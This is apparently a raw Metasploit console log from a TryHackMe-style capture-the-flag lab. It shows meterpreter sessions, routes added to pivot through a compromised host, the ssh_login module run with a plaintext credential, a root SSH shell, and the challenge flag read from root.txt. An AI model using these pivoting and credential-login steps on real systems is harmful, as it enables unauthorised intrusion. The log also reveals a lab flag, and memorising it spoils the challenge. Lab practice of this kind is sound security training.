+  2         meterpreter x86/linux  www-data @ 172.28.101.50  10.8.28.227:4433 -> 10.10.125.61:54540 (172.28.101.50
+                                                             )
+
+msf6 auxiliary(server/socks_proxy) > 
+msf6 auxiliary(scanner/ssh/ssh_login) > route add 172.28.101.51/32 3
+[*] Route added
+msf6 auxiliary(scanner/ssh/ssh_login) > route add 172.17.0.1/32 3
+[*] Route added
+msf6 auxiliary(scanner/ssh/ssh_login) > route print
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   172.17.0.1         255.255.255.255    Session 3
+   172.28.101.51      255.255.255.255    Session 3
+
+[*] There are currently no IPv6 routes defined.
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information               Connection
+  --  ----  ----                   -----------               ----------
+  1         shell cmd/unix                                   10.8.28.227:4444 -> 10.10.125.61:55192 (10.10.125.61)
+  3         meterpreter x86/linux  www-data @ 172.28.101.50  10.8.28.227:4433 -> 10.10.125.61:54998 (172.28.101.50
+                                                             )
+
+msf6 auxiliary(scanner/ssh/ssh_login) > options
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (Accepted
+                                                : none, user, user&realm)
+   PASSWORD          p4$$w0rd         no        A specific password to authenticate with
+   PASS_FILE                          no        File containing passwords, one per line
+   RHOSTS            172.17.0.1       yes       The target host(s), see https://github.com/rapid7/metasploit-frame
+                                                work/wiki/Using-Metasploit
+   RPORT             22               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads (max one per host)
+   USERNAME          santa            no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair p
+                                                er line
+   USER_AS_PASS      false            no        Try the username as the password for all users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           false            yes       Whether to print output for all attempts
+
+msf6 auxiliary(scanner/ssh/ssh_login) > run
+
+[*] 172.17.0.1:22 - Starting bruteforce
+[+] 172.17.0.1:22 - Success: 'santa:p4$$w0rd' 'uid=0(root) gid=0(root) groups=0(root) Linux hostname 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux '
+[*] SSH session 4 opened (10.8.28.227-10.10.125.61:50000 -> 172.17.0.1:22) at 2022-12-10 04:35:29 -0500
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > 
+
+
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information               Connection
+  --  ----  ----                   -----------               ----------
+  1         shell cmd/unix                                   10.8.28.227:4444 -> 10.10.125.61:55192 (10.10.125.61)
+  3         meterpreter x86/linux  www-data @ 172.28.101.50  10.8.28.227:4433 -> 10.10.125.61:54998 (172.28.101.50
+                                                             )
+  4         shell linux            SSH root @                10.8.28.227-10.10.125.61:50000 -> 172.17.0.1:22 (172.
+                                                             17.0.1)
+
+msf6 auxiliary(scanner/ssh/ssh_login) > 
+msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 4
+[*] Starting interaction with 4...
+
+mesg: ttyname failed: Inappropriate ioctl for device
+ls
+root.txt
+ls -la /
+total 84
+drwxr-xr-x  22 root root  4096 Sep 13 16:48 .
+drwxr-xr-x  22 root root  4096 Sep 13 16:48 ..
+drwxr-xr-x   2 root root  4096 Sep 13 16:52 bin
+drwxr-xr-x   3 root root  4096 Sep 13 16:55 boot
+drwxr-xr-x  18 root root  3740 Dec 10 08:13 dev
+drwxr-xr-x  84 root root  4096 Sep 13 19:39 etc
+drwxr-xr-x   3 root root  4096 Sep 13 16:54 home
+lrwxrwxrwx   1 root root    34 Sep 13 16:48 initrd.img -> boot/initrd.img-4.15.0-156-generic
+lrwxrwxrwx   1 root root    34 Sep 13 16:48 initrd.img.old -> boot/initrd.img-4.15.0-156-generic
+drwxr-xr-x  19 root root  4096 Sep 13 16:53 lib
+drwxr-xr-x   2 root root  4096 Sep 13 16:52 lib64
+drwx------   2 root root 16384 Sep 13 16:47 lost+found
+drwxr-xr-x   3 root root  4096 Sep 13 16:48 media
+drwxr-xr-x   2 root root  4096 Sep 15  2021 mnt
+drwxr-xr-x   4 root root  4096 Sep 13 16:57 opt
+dr-xr-xr-x 123 root root     0 Dec 10 08:13 proc
+drwx------   4 root root  4096 Dec 10 09:35 root
+drwxr-xr-x  25 root root   800 Dec 10 09:35 run
+drwxr-xr-x   2 root root  4096 Sep 13 16:55 sbin
+drwxr-xr-x   2 root root  4096 Sep 15  2021 srv
+dr-xr-xr-x  13 root root     0 Dec 10 08:13 sys
+drwxrwxrwt  10 root root  4096 Dec 10 09:35 tmp
+drwxr-xr-x  11 root root  4096 Sep 13 16:57 usr
+drwxr-xr-x  11 root root  4096 Sep 13 16:48 var
+lrwxrwxrwx   1 root root    31 Sep 13 16:48 vmlinuz -> boot/vmlinuz-4.15.0-156-generic
+lrwxrwxrwx   1 root root    31 Sep 13 16:48 vmlinuz.old -> boot/vmlinuz-4.15.0-156-generic
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat root.txt
+THM{47C61A0FA8738BA77308A8A600F88E4B}
+
